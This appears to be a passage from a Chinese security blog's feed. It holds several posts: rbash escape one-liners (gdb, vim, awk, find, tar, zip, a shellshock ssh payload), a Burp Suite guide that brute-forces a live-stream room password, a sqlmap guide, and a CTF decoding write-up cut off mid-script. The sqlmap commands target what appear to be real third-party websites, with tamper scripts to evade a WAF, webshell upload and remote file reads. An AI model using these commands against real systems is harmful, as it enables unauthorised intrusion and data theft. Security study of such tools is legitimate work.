title="常见绕过技术"></a>常见绕过技术</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1）如果允许使用“&#x2F;”的话，则可以运行&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;bash。</span><br><span class="line">2）如果可以运行cp命令，则可以将&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;bash复制到自己的目录中。</span><br><span class="line">3) 使用 ftp &gt; !&#x2F;bin&#x2F;sh 或者 !&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>) 使用 gdb &gt; !/bin/sh 或者 !/bin/bash</span><br><span class="line"></span><br><span class="line">[steady@gongxinao ~]$ gdb</span><br><span class="line">GNU gdb (GDB) Red Hat Enterprise Linux <span class="number">7.6</span><span class="number">.1</span><span class="number">-119.</span>el7</span><br><span class="line">Copyright (C) <span class="number">2013</span> Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version <span class="number">3</span> <span class="keyword">or</span> later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This <span class="keyword">is</span> free software: you are free to change <span class="keyword">and</span> redistribute it.</span><br><span class="line">There <span class="keyword">is</span> NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line"><span class="keyword">and</span> <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured <span class="keyword">as</span> <span class="string">&quot;x86_64-redhat-linux-gnu&quot;</span>.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">(gdb) !/bin/sh</span><br><span class="line">sh<span class="number">-4.2</span>$ </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">5) 使用 more&#x2F;man&#x2F;less &gt; !&#x2F;bin&#x2F;sh 或者 !&#x2F;bin&#x2F;bash</span><br><span class="line">less 和 more阅读页面时候，也会进入命令模式，键入q则会直接退出，如果键入 !&#39;sh&#39; 则会进入一个shell。</span><br><span class="line">6) 使用 vim &gt; !&#x2F;bin&#x2F;sh 或者 !&#x2F;bin&#x2F;bash 或者 set shell&#x3D;&#x2F;bin&#x2F;bash shell</span><br><span class="line">vi steady.txt 方法vi进入编辑器命令模式</span><br><span class="line">:!&#x2F;bin&#x2F;bash   输入&#x2F;bin&#x2F;bash</span><br><span class="line">7) 使用 rvim &gt; :python import os; os.system(&quot;&#x2F;bin&#x2F;bash )</span><br><span class="line">8) 使用 scp &gt; scp -S &#x2F;path&#x2F;yourscript x y:</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">9) 使用 awk &gt; awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh 或者 &#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br><span class="line">[steady@gongxinao ~]$ awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&#125;&#39;</span><br><span class="line">sh-4.2$ awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br><span class="line">[steady@gongxinao ~]$ </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10) 使用 find &gt; find &#x2F; -name test -exec &#x2F;bin&#x2F;sh 或者 &#x2F;bin&#x2F;bash \;</span><br></pre></td></tr></table></figure><h4 id="其他技术"><a href="#其他技术" class="headerlink" title="其他技术"></a>其他技术</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1)使用 ssh &gt; ssh username@IP - t &quot;&#x2F;bin&#x2F;sh&quot; 或者 &quot;&#x2F;bin&#x2F;bash&quot;</span><br><span class="line">2)使用 ssh2 &gt; ssh username@IP -t &quot;bash --noprofile&quot;</span><br><span class="line">3)使用 ssh3 &gt; ssh username@IP -t &quot;() &#123; :; &#125;; &#x2F;bin&#x2F;bash&quot; (shellshock)</span><br><span class="line">通过ssh链接当前IP的当前用户并启动&#x2F;bin&#x2F;bash，主要用到了ssh命令的t参数。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4)使用 ssh4 &gt; ssh -o ProxyCommand&#x3D;&quot;sh -c &#x2F;tmp&#x2F;yourfile.sh&quot; 127.0.0.1 (SUID)</span><br><span class="line">5)使用 git &gt; git help status &gt; ，然后就可以运行 !&#x2F;bin&#x2F;bash了</span><br><span class="line">6)使用 pico &gt; pico -s &quot;&#x2F;bin&#x2F;bash&quot; ，然后就可以对 &#x2F;bin&#x2F;bash 执行写操作，最后执行 CTRL + T</span><br><span class="line">7)使用 zip &gt; zip &#x2F;tmp&#x2F;test.zip &#x2F;tmp&#x2F;test -T --unzip-command&#x3D;&quot;sh -c&#x2F;bin&#x2F;bash&quot;</span><br><span class="line">8)使用 tar &gt; tar cf &#x2F;dev&#x2F;null testfile --checkpoint&#x3D;1 --checkpointaction&#x3D;exec&#x3D;&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><h4 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h4><p>查看当前用户是否对环境变量有写的权限。如果有w权限我们就可以修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">declare -x PATH=<span class="string">&quot;/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:/home/steady/.local/bin:/home/steady/bin&quot;</span></span><br><span class="line">declare -x PWD=<span class="string">&quot;/home/steady&quot;</span></span><br><span class="line">declare -x QT_IM_MODULE=<span class="string">&quot;ibus&quot;</span></span><br><span class="line">declare -x SESSION_MANAGER=<span class="string">&quot;local/unix:@/tmp/.ICE-unix/1942,unix/unix:/tmp/.ICE-unix/1942&quot;</span></span><br><span class="line">declare -x SHELL=<span class="string">&quot;/bin/bash&quot;</span></span><br></pre></td></tr></table></figure><p>如果具有写入的权限，呢么我们可以把/bin/bash添加到环境变量$PATH中。$PATH是一个Linux的环境变量，用于命令搜索。</p><p>/bin是系统的一些指令。bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。当时我们输入pwd的时候计算机首先去/bin中去查找，发现存在pwd命令，可以使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>所以我们在讲/bin/bash输入到PATH中，我们输入/bin/bash就会切换一个shell。进而达到了绕过rbash的目的。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuit使用</title>
      <link href="2019/07/08/Burp/"/>
      <url>2019/07/08/Burp/</url>
      
        <content type="html"><![CDATA[<h3 id="Burp"><a href="#Burp" class="headerlink" title="Burp"></a>Burp</h3><h4 id="暴力破解功能"><a href="#暴力破解功能" class="headerlink" title="暴力破解功能"></a>暴力破解功能</h4><h5 id="Grep-Extract"><a href="#Grep-Extract" class="headerlink" title="Grep_Extract"></a>Grep_Extract</h5><p>1、斗鱼直播间直播密码暴力破解</p><p>无论成功与否,返回包的数据长度和状态码都没有太大的区别</p><p>唯一区别就是返回内容中的</p><p><code>&#123;&quot;error&quot;:0,&quot;data&quot;:&#123;&quot;status&quot;:0&#125;&#125;</code></p><p>如果成功为status为1</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200523143544080.png" alt="image-20200523143544080"></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200523143601247.png" alt="image-20200523143601247"></p><p>我们可以看到返回包的长度和状态都是一样的无法区别暴力破解如果成功的话是什么状态.</p><p>这里我们使用到Grep_Extract选项—提取我们返回包中的内容,然后把选中的内容放在我们结果栏目中作为一列,供我们选择,而且我们也可以选在提取内容的最大长度,如图</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200523154812093.png" alt="image-20200523154812093"></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200523155146442.png" alt="image-20200523155146442"></p><p>如果我们选择</p><p><code>&#123;&quot;error&quot;:0,&quot;data&quot;:&#123;&quot;status&quot;:0&#125;&#125;</code></p><p>我们看到我们的选中内容出现在结果项中的某一列,这样我们就可以直接找到我们的有效载荷</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200523155256740.png" alt="image-20200523155256740"></p><h5 id="Grep-Match"><a href="#Grep-Match" class="headerlink" title="Grep_Match"></a>Grep_Match</h5><p>这个功能与上者差不多,用于检测返回包中是否存在我们指定的特殊字符,只不过这种特殊字符我们可以自定义,而上者我们只能在返回包中选择</p><p>比如我们自定义<code>&#123;&quot;status&quot;:1&#125;</code></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200523155719433.png" alt="image-20200523155719433"></p><p>然后爆破,可以看到会自动检测返回包中是否有该字符串,因为我们也可以添加各种具有代表性的字符,如果mysql数据库的关键报错信息等等</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200523155752336.png" alt="image-20200523155752336"></p><h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><p>burp右键可以直接生成payload,一般所抓取的页面都会有明显的哈希参数</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200526094327945.png" alt="image-20200526094327945"></p><h4 id="Collaborator-Client"><a href="#Collaborator-Client" class="headerlink" title="Collaborator Client"></a>Collaborator Client</h4><p>对于平时测试中的一些盲问题，例如盲 xss，盲 xxe，盲 ssrf 等，如果不能看到一些回显信息，无法判断是否存在漏洞时，可以使用 burp 的 collaborator 来进行尝试。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111165756059.png" alt="image-20201111165756059"></p><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>Ping命令</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111170342068.png" alt="image-20201111170342068"></p><p>Http请求</p><h4 id="Makeinfo敏感信息检测"><a href="#Makeinfo敏感信息检测" class="headerlink" title="Makeinfo敏感信息检测"></a>Makeinfo敏感信息检测</h4><p>对应的敏感信息会显示出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">邮箱 -&gt; 黄色</span><br><span class="line">内网IP -&gt; 红色</span><br><span class="line">手机号码 -&gt; 绿色</span><br><span class="line">身份证号码 -&gt; 绿色</span><br><span class="line">其他 -&gt; 无 (只开启Unexpected information标签页)</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201112111721627.png" alt="image-20201112111721627"></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap使用</title>
      <link href="2019/07/08/sqlmap%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E5%AD%A6%E4%B9%A0/"/>
      <url>2019/07/08/sqlmap%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap使用以及学习"><a href="#sqlmap使用以及学习" class="headerlink" title="sqlmap使用以及学习"></a>sqlmap使用以及学习</h1><h2 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h2><h3 id="sqlmap快速查找敏感数据库、数据表、数据字段"><a href="#sqlmap快速查找敏感数据库、数据表、数据字段" class="headerlink" title="sqlmap快速查找敏感数据库、数据表、数据字段"></a>sqlmap快速查找敏感数据库、数据表、数据字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--search -D：搜索某个数据库</span><br><span class="line">--search -T：搜索某个表名</span><br><span class="line">--search -C：搜索某个字段名</span><br></pre></td></tr></table></figure><p>通过搜索形如username、password的字段即可快速定位重要数据表。</p><h3 id="检测使用waf"><a href="#检测使用waf" class="headerlink" title="检测使用waf"></a>检测使用waf</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890&quot; --identify-waf</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@steady:~<span class="comment"># sqlmap -u &quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&quot; --identify-waf</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                    </span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.4.9.5#dev&#125;                                                                                                                         </span><br><span class="line">|_ -| . [)]     | .&#x27;| . |                                                                                                                                       </span><br><span class="line">|___|_  [&#x27;]_|_|_|__,|  _|                                                                                                                                       </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                                                                     </span><br><span class="line"></span><br><span class="line">[14:18:20] [WARNING] switch/option &#x27;<span class="comment">--identify-waf&#x27; is deprecated (hint: functionality being done automatically)</span></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the <span class="keyword">end</span> <span class="keyword">user</span><span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 14:18:20 /2020-11-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[14:18:21] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">you have not declared cookie(s), while server wants to set its own (&#x27;</span>PHPSESSID=r3ng6cf272b...decjvebtm2<span class="string">&#x27;). Do you want to use those [Y/n] y</span></span><br><span class="line"><span class="string">[14:18:26] [INFO] checking if the target is protected by some kind of WAF/IPS</span></span><br><span class="line"><span class="string">[14:18:27] [CRITICAL] WAF/IPS identified as &#x27;</span>ModSecurity (Trustwave)<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>可以看到检测到的waf为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WAF&#x2F;IPS identified as &#39;ModSecurity (Trustwave)&#39;</span><br></pre></td></tr></table></figure><h3 id="获取数据库版本、获取系统信息"><a href="#获取数据库版本、获取系统信息" class="headerlink" title="获取数据库版本、获取系统信息"></a>获取数据库版本、获取系统信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-f: 检测数据库，服务器等（fingerprint）信息，</span><br><span class="line">-b或者--banner：获取数据库版本信息和数据库类型</span><br><span class="line">--batch:不与使用者进行信息交互，直接执行</span><br></pre></td></tr></table></figure><h3 id="指定使用的SQL注入技术"><a href="#指定使用的SQL注入技术" class="headerlink" title="指定使用的SQL注入技术"></a>指定使用的SQL注入技术</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--technique T</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">B: Boolean-based blind SQL injection（布尔型注入）</span><br><span class="line">E: Error-based SQL injection（报错型注入）</span><br><span class="line">U: UNION query SQL injection（可联合查询注入）</span><br><span class="line">S: Stacked queries SQL injection（可多语句查询注入）</span><br><span class="line">T: Time-based blind SQL injection（基于时间延迟注入）</span><br></pre></td></tr></table></figure><h3 id="指定数据库类型"><a href="#指定数据库类型" class="headerlink" title="指定数据库类型"></a>指定数据库类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--dbms&#x3D;mysql</span><br></pre></td></tr></table></figure><h3 id="随机浏览器请求头"><a href="#随机浏览器请求头" class="headerlink" title="随机浏览器请求头"></a>随机浏览器请求头</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--random-agent</span><br></pre></td></tr></table></figure><h3 id="指定Get型参数"><a href="#指定Get型参数" class="headerlink" title="指定Get型参数"></a>指定Get型参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-p 参数</span><br></pre></td></tr></table></figure><h3 id="指定使用的脚本类型"><a href="#指定使用的脚本类型" class="headerlink" title="指定使用的脚本类型"></a>指定使用的脚本类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">–tamper&#x3D;&quot;&quot;</span><br></pre></td></tr></table></figure><h3 id="脚本类型"><a href="#脚本类型" class="headerlink" title="脚本类型"></a>脚本类型</h3><p>randomcomments.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">作用：用&#x2F;**&#x2F;分割sql关键字。</span><br><span class="line">Example：&#96;INSERT becomes &#39;IN&#x2F;&#x2F;S&#x2F;&#x2F;ERT&#39;。</span><br></pre></td></tr></table></figure><h3 id="指定延迟时间"><a href="#指定延迟时间" class="headerlink" title="指定延迟时间"></a>指定延迟时间</h3><p>–delay=DELAY</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每次HTTP（S）请求之间延迟时间，值为浮点数，单位为秒，默认无延迟。</span><br></pre></td></tr></table></figure><h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><p>写入文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">–file-write&#x3D;&quot;本地路径&quot; –file-dest&#x3D;&quot;远程路径&quot;</span><br><span class="line">–file-write&#x3D;&quot;&#x2F;home&#x2F;temp&#x2F;shell.php&quot;  –file-dest&#x3D;&quot;C:\web\2.php&quot;</span><br></pre></td></tr></table></figure><p>读取文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sqlmap -u &quot;http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264&amp;Pageno&#x3D;1&quot; --file-read&#x3D;&quot;C:&#x2F;WINDOWS&#x2F;system32&#x2F;axperf.ini&quot;</span><br></pre></td></tr></table></figure><h2 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890&quot;  --dbms&#x3D;mysql --random-agent -p ac01 –tamper&#x3D;&quot;randomcomments.py&quot; --delay&#x3D;5</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全工具学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-杂项刷题3</title>
      <link href="2019/05/30/CTF-%E6%9D%82%E9%A1%B9%E5%88%B7%E9%A2%982/"/>
      <url>2019/05/30/CTF-%E6%9D%82%E9%A1%B9%E5%88%B7%E9%A2%982/</url>
      
        <content type="html"><![CDATA[<h1 id="Buuctf"><a href="#Buuctf" class="headerlink" title="Buuctf"></a>Buuctf</h1><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="爬"><a href="#爬" class="headerlink" title="爬"></a>爬</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted$ file &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted&#x2F;爬</span><br><span class="line">&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted&#x2F;爬: PDF document, version 1.7</span><br></pre></td></tr></table></figure><p>pdf文件打开。图片背后有十六进制转化得到flag。</p><h3 id="WUSTCTF2020-girlfriend"><a href="#WUSTCTF2020-girlfriend" class="headerlink" title="[WUSTCTF2020]girlfriend"></a>[WUSTCTF2020]girlfriend</h3><p>dtmf-decoder</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted$ dtmf2num &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted&#x2F;girlfriend.wav</span><br><span class="line"></span><br><span class="line">DTMF2NUM 0.1.1</span><br><span class="line">by Luigi Auriemma</span><br><span class="line">e-mail: aluigi@autistici.org</span><br><span class="line">web:    aluigi.org</span><br><span class="line"></span><br><span class="line">- open &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted&#x2F;girlfriend.wav</span><br><span class="line">  wave size      7466540</span><br><span class="line">  format tag     1</span><br><span class="line">  channels:      2</span><br><span class="line">  samples&#x2F;sec:   44100</span><br><span class="line">  avg&#x2F;bytes&#x2F;sec: 176400</span><br><span class="line">  block align:   4</span><br><span class="line">  bits:          16</span><br><span class="line">  samples:       3733270</span><br><span class="line">  bias adjust:   215</span><br><span class="line">  volume peaks:  -12024 12025</span><br><span class="line">  normalize:     20742</span><br><span class="line">  resampling to: 8000hz</span><br><span class="line"></span><br><span class="line">- MF numbers:    47777777</span><br><span class="line"></span><br><span class="line">- DTMF numbers:  999*666*88*2*777*33*6*999*4*4444*777*555*333*777*444*33*66*3*7777</span><br></pre></td></tr></table></figure><p>手机键盘。</p><p>ttl隐写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">63    00111111</span><br><span class="line">127   01111111</span><br><span class="line">191   10111111</span><br><span class="line">255   11111111</span><br></pre></td></tr></table></figure><p>每一个 TTL 只有前两位隐藏数据，每四个为一组，隐藏一个字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    a=fp.readlines()</span><br><span class="line">    p=[]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(a)):</span><br><span class="line">       p.append(int(a[x])) </span><br><span class="line">    s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">63</span>):</span><br><span class="line">            b=<span class="string">&#x27;00&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span>(i==<span class="number">127</span>):</span><br><span class="line">            b=<span class="string">&#x27;01&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span>(i==<span class="number">191</span>):</span><br><span class="line">            b=<span class="string">&#x27;10&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b=<span class="string">&#x27;11&#x27;</span></span><br><span class="line">        s +=b</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">8</span>):</span><br><span class="line">    flag += chr(int(s[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>发现是一个压缩包。一键脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>():</span></span><br><span class="line">    f = open(<span class="string">&#x27;t.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    fh = open(<span class="string">&#x27;flag.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    binstring = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    hexstring = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> f.readlines():</span><br><span class="line">        bins = <span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.format(int(num.strip()))</span><br><span class="line">        binstring += bins[:<span class="number">2</span>]</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(binstring), <span class="number">8</span>):</span><br><span class="line">        hexstring += chr(int(binstring[i:i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    fh.write(binascii.unhexlify(hexstring))</span><br><span class="line">    fh.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(<span class="string">&quot;Start...&quot;</span>)</span><br><span class="line">    Decrypt()</span><br><span class="line">    print(<span class="string">&quot;Done!&quot;</span>)</span><br></pre></td></tr></table></figure><p>伪加密，循环base64解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 